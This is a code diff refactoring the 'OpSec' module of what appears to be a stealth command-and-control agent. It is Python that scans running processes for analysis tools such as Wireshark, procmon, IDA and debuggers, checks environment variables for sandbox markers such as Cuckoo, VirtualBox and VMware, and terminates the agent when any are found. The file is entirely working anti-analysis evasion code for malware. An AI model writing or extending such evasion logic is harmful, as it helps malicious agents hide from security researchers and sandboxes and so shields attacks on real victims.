@@ -1,85 +1,61 @@
+"""
+Stealth-C2 — OpSec Module
+Pre-flight checks that run before the agent connects.
+Kills the process if analysis tools or sandbox indicators are detected.
+"""
+
+from __future__ import annotations
+
 import os
 import sys
 import subprocess
 import platform
 import time
 
-# --- CONFIGURATION ---
-# Processes that indicate we are being watched.
-# If any of these are found, the agent will refuse to run.
-BLACKLISTED_PROCESSES = [
-    "wireshark",      # Network sniffer
-    "fiddler",        # HTTP debugger
-    "tcpview",        # Port monitor
-    "processhacker",  # Advanced task manager
-    "procmon",        # Process monitor
-    "ida64",          # Disassembler
-    "x64dbg",         # Debugger
-    "ollydbg"         # Debugger
+# Processes that indicate an active analysis environment
+BLACKLISTED_PROCESSES: list[str] = [
+    "wireshark", "fiddler", "tcpview", "processhacker",
+    "procmon", "ida64", "ida", "x64dbg", "x32dbg", "ollydbg",
 ]
 
-def check_process_list():
-    """
-    Scans running processes to see if any analysis tools are active.
-    Returns True if a threat is found.
-    """
+# Environment variable name substrings common in sandbox platforms
+SANDBOX_ENV_MARKERS: list[str] = [
+    "CUCKOO", "VBOX", "VMWARE", "SANDBOXIE", "ANALYSIS",
+]
+
+
+def check_process_list() -> bool:
     system = platform.system()
-    
     try:
-        # Get list of running processes based on OS
         if system == "Windows":
-            # 'tasklist' is standard on Windows
             output = subprocess.check_output("tasklist", shell=True).decode().lower()
         elif system == "Linux":
-            # 'ps -A' lists all processes on Linux
             output = subprocess.check_output(["ps", "-A"], text=True).lower()
         else:
-            return False # Unknown OS, assume safe
-
-        # Check against our blacklist
-        for bad_app in BLACKLISTED_PROCESSES:
-            if bad_app in output:
-                print(f"[!] OpSec Triggered: Found dangerous process '{bad_app}'")
+            return False
+        for proc in BLACKLISTED_PROCESSES:
+            if proc in output:
+                print(f"[opsec] Threat detected — '{proc}' is running.")
                 return True
-                
     except Exception as e:
-        # If we can't check processes, it's suspicious, but we proceed cautiously
-        print(f"[!] OpSec Check Error: {e}")
-        return False
-        
+        print(f"[opsec] Process scan error: {e}")
     return False
 
-def check_sandbox_env():
-    """
-    Checks for environment variables often set by malware sandboxes (Cuckoo, etc.)
-    """
-    # Common sandbox indicators
-    sandbox_vars = ["CUCKOO_ANALYSIS_TASK_ID", "VBOX", "VMWARE"]
-    
+
+def check_sandbox_env() -> bool:
     for var in os.environ:
-        for sandbox_flag in sandbox_vars:
-            if sandbox_flag in var.upper():
-                print(f"[!] OpSec Triggered: Sandbox environment variable found ({var})")
+        for marker in SANDBOX_ENV_MARKERS:
+            if marker in var.upper():
+                print(f"[opsec] Sandbox indicator found: {var}")
                 return True
     return False
 
-def is_compromised():
-    """
-    Run all checks. Returns True if we should shut down.
-    """
-    if check_sandbox_env():
-        return True
-    
-    if check_process_list():
-        return True
-        
-    return False
 
-def engage_kill_switch():
-    """
-    Wipes the agent from memory (exits) to prevent analysis.
-    """
-    print("🛑 THREAT DETECTED. ENGAGING KILL SWITCH.")
-    print("The agent will now terminate to protect operation security.")
+def is_compromised() -> bool:
+    return check_sandbox_env() or check_process_list()
+
+
+def engage_kill_switch() -> None:
+    print("[opsec] ⛔  Threat detected — terminating to protect OpSec.")
     time.sleep(1)
     sys.exit(0)
